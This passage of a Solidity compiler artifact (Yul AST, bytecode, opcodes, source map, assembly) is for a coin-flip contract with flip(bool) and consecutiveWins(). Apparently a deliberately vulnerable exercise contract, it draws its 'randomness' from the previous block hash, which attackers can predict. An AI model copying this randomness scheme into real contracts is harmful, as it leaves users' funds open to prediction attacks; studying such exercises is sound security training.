													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1513:7:1",
														"type": ""
													}
												],
												"src": "1479:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1620:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1630:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1641:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1630:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1602:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1612:7:1",
														"type": ""
													}
												],
												"src": "1575:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1701:190:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1711:33:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1738:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1720:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1720:24:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1711:5:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1834:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1836:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1836:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1836:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1759:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1766:66:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1756:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1756:77:1"
															},
															"nodeType": "YulIf",
															"src": "1753:2:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1865:20:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1876:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1883:1:1",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1872:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1872:13:1"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "1865:3:1"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1687:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "1697:3:1",
														"type": ""
													}
												],
												"src": "1658:233:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1925:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1942:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1945:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1935:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1935:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1935:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2039:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2042:4:1",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2032:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2032:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2032:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2063:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2066:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2056:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2056:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2056:15:1"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1897:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2111:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2128:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2131:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2121:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2121:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2121:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2225:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2228:4:1",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2218:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2218:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2218:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2249:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2252:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2242:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2242:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2242:15:1"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2083:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2309:76:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2363:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2372:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2375:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2365:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2365:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2365:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2332:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2354:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2339:14:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2339:21:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2329:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2329:32:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2322:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2322:40:1"
															},
															"nodeType": "YulIf",
															"src": "2319:2:1"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2302:5:1",
														"type": ""
													}
												],
												"src": "2269:116:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610182565b60405180910390f35b610073610120565b604051610080919061019d565b60405180910390f35b60008060014361009991906101e9565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101b8565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610233565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102da565b92915050565b60006020828403121561014d57600080fd5b600061015b84828501610126565b91505092915050565b61016d8161021d565b82525050565b61017c81610229565b82525050565b60006020820190506101976000830184610164565b92915050565b60006020820190506101b26000830184610173565b92915050565b60006101c382610229565b91506101ce83610229565b9250826101de576101dd6102ab565b5b828204905092915050565b60006101f482610229565b91506101ff83610229565b9250828210156102125761021161027c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b600061023e82610229565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156102715761027061027c565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102e38161021d565b81146102ee57600080fd5b5056fea2646970667358221220f774e5a9fdad64946a77b26607e4b292f48affa09f109927973acf2b3c22b8ee64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x182 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1E9 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x233 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x16D DUP2 PUSH2 0x21D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x17C DUP2 PUSH2 0x229 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x197 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x164 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x173 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C3 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1CE DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1DE JUMPI PUSH2 0x1DD PUSH2 0x2AB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FF DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x212 JUMPI PUSH2 0x211 PUSH2 0x27C JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x23E DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x271 JUMPI PUSH2 0x270 PUSH2 0x27C JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x21D JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF7 PUSH21 0xE5A9FDAD64946A77B26607E4B292F48AFFA09F1099 0x27 SWAP8 GASPRICE 0xCF 0x2B EXTCODECOPY 0x22 0xB8 0xEE PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "60:766:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;308:515;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;85:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;308:515;351:4;368:18;422:1;407:12;:16;;;;:::i;:::-;397:27;389:36;;368:57;;454:10;442:8;;:22;438:63;;;481:8;;;438:63;524:10;513:8;:21;;;;545:16;577:6;;564:10;:19;;;;:::i;:::-;545:38;;594:9;618:1;606:8;:13;:28;;629:5;606:28;;;622:4;606:28;594:40;;659:6;651:14;;:4;:14;;;647:169;;;682:15;;:17;;;;;;;;;:::i;:::-;;;;;;721:4;714:11;;;;;;;647:169;776:1;758:15;:19;;;;799:5;792:12;;;;;308:515;;;;:::o;85:30::-;;;;:::o;7:133:1:-;;88:6;75:20;66:29;;104:30;128:5;104:30;:::i;:::-;56:84;;;;:::o;146:256::-;;251:2;239:9;230:7;226:23;222:32;219:2;;;267:1;264;257:12;219:2;310:1;335:50;377:7;368:6;357:9;353:22;335:50;:::i;:::-;325:60;;281:114;209:193;;;;:::o;408:109::-;489:21;504:5;489:21;:::i;:::-;484:3;477:34;467:50;;:::o;523:118::-;610:24;628:5;610:24;:::i;:::-;605:3;598:37;588:53;;:::o;647:210::-;;772:2;761:9;757:18;749:26;;785:65;847:1;836:9;832:17;823:6;785:65;:::i;:::-;739:118;;;;:::o;863:222::-;;994:2;983:9;979:18;971:26;;1007:71;1075:1;1064:9;1060:17;1051:6;1007:71;:::i;:::-;961:124;;;;:::o;1091:185::-;;1148:20;1166:1;1148:20;:::i;:::-;1143:25;;1182:20;1200:1;1182:20;:::i;:::-;1177:25;;1221:1;1211:2;;1226:18;;:::i;:::-;1211:2;1268:1;1265;1261:9;1256:14;;1133:143;;;;:::o;1282:191::-;;1342:20;1360:1;1342:20;:::i;:::-;1337:25;;1376:20;1394:1;1376:20;:::i;:::-;1371:25;;1415:1;1412;1409:8;1406:2;;;1420:18;;:::i;:::-;1406:2;1465:1;1462;1458:9;1450:17;;1327:146;;;;:::o;1479:90::-;;1556:5;1549:13;1542:21;1531:32;;1521:48;;;:::o;1575:77::-;;1641:5;1630:16;;1620:32;;;:::o;1658:233::-;;1720:24;1738:5;1720:24;:::i;:::-;1711:33;;1766:66;1759:5;1756:77;1753:2;;;1836:18;;:::i;:::-;1753:2;1883:1;1876:5;1872:13;1865:20;;1701:190;;;:::o;1897:180::-;1945:77;1942:1;1935:88;2042:4;2039:1;2032:15;2066:4;2063:1;2056:15;2083:180;2131:77;2128:1;2121:88;2228:4;2225:1;2218:15;2252:4;2249:1;2242:15;2269:116;2339:21;2354:5;2339:21;:::i;:::-;2332:5;2329:32;2319:2;;2375:1;2372;2365:12;2319:2;2309:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "161400",
								"executionCost": "25228",
								"totalCost": "186628"
							},
							"external": {
								"consecutiveWins()": "1129",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 826,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 826,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 826,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 162,
									"end": 239,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 145,
									"end": 239,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 145,
									"end": 239,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 248,
									"end": 300,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 248,
									"end": 300,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 248,
									"end": 300,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 248,
									"end": 300,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 291,
									"end": 292,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 273,
									"end": 288,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 273,
									"end": 292,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 273,
									"end": 292,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 273,
									"end": 292,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 273,
									"end": 292,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 826,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 826,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 826,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 826,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 826,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 826,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 826,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220f774e5a9fdad64946a77b26607e4b292f48affa09f109927973acf2b3c22b8ee64736f6c63430008000033",
									".code": [
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 826,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 826,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 308,
											"end": 823,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 308,
											"end": 823,
											"name": "SWAP1",
